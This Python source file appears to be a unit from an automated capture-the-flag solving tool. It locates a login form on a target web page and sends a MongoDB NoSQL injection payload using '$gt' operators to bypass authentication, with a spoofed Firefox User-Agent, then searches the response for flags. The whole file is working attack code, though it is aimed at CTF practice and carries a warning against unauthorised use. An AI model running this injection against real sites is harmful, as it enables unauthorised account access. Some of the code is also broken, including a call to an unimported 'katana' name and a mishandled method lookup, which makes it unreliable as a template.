"""
Basic NoSQL Injection 

This will attempt basic NoSQL injection (MongoDB) of the form 
``"username": {"$gt": ""}, "password": {"$gt": ""},``.

It passes a User-Agent to act as a regular Firefox web browser.

This unit inherits from :class:`katana.units.web.WebUnit` as that contains
lots of predefined variables that can be used throughout multiple web units.

.. warning::
    
    This unit automatically attempts to perform malicious actions on the 
    target. **DO NOT** use this in any circumstances where you do not have the
    authority to operate!
"""


import requests
import re
from typing import Any

from katana.unit import NotApplicable
from katana.units import web


class Unit(web.WebUnit):
    PRIORITY = 25
    """
    Priority works with 0 being the highest priority, and 100 being the 
    lowest priority. 50 is the default priorty. This unit has a higher
    priority.
    """

    GROUPS = ["web", "shell", "basic_nosqli"]
    """
    These are "tags" for a unit. Considering it is a web unit, "web"
    is included, as well as the tag "shell", and the name of the unit itself,
    "basic_nosqli".
    """

    RECURSE_SELF = False
    """
    This unit should not recurse on itself.
    """

    def __init__(self, *args, **kwargs):
        """
        The constructor is included to first determine if there is a form
        on this web page. If no form is found, it will abort.
        """

        # Run the parent constructor, to ensure this is a valid URL
        super(Unit, self).__init__(*args, **kwargs)

        self.action = re.findall(
            rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        self.method = re.findall(
            rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )

        self.username = re.findall(
            web.user_regex, self.target.content, flags=re.IGNORECASE
        )
        self.password = re.findall(
            web.pass_regex, self.target.content, flags=re.IGNORECASE
        )

        # Sometimes, a form might not have an explicit location. Assume the current page!
        if self.action == []:
            self.action = [b"#"]

        # Only run this if we have potential information...
        if not (self.action and self.method and self.username and self.password):
            raise NotApplicable("no form found")

    def evaluate(self, case: Any):
        """
        Evaluate the target. Attempt to perform NoSQL injection (MongoDB) on
        the form found on the target web page.

        :param case: A case returned by ``enumerate``. For this unit,\
        the ``enumerate`` function is not used.

        :return: None. This function should not return any data.

        """

        # Extract the found values
        if self.action and self.method and self.username and self.password:
            if self.action:
                action = self.action[0].decode("utf-8")
            if self.method:
                method = self.method[0].decode("utf-8")
            if self.username:
                username = self.username[0].decode("utf-8")
            if self.password:
                password = self.password[0].decode("utf-8")

            try:
                method = vars(requests)[method.lower()]
            except IndexError:
                # Could not find a valid method... default to POST
                method = requests.post

        # Grab the URL pieces
        url_form = self.target.upstream.decode("utf-8").split("/")

        # if this is a relative path, get the furthermost directory location
        if len(url_form) > 3:
            last_location = "/".join(url_form[:-1]) + "/"
        else:
            last_location = self.target.upstream.decode("utf-8").rstrip("/") + "/"

        try:
            r = self.session.request(
                method.lower(),
                last_location + action,
                json={"username": {"$gt": ""}, "password": {"$gt": ""},},
                timeout=2,
                headers={"User-Agent": web.firefox_browser_user_agent},
            )

            # Hunt for flags if we have a successful injection!
            katana.locate_flags(self, r.text)
        except (
            requests.exceptions.ConnectionError,
            requests.exceptions.ChunkedEncodingError,
        ):
            # We can't reach the site... stop trying this unit!
            return

        # Hunt for flags. If we found one, stop all other requests!
        hit = self.manager.find_flag(self, r.text)

        # If we found a flag, stop trying SQL injection!!
        if hit:
            return

        # You should ONLY return what is "interesting"
        # Since we cannot gauge the results of this payload versus the others,
        # we will only care if we found the flag.
        return None
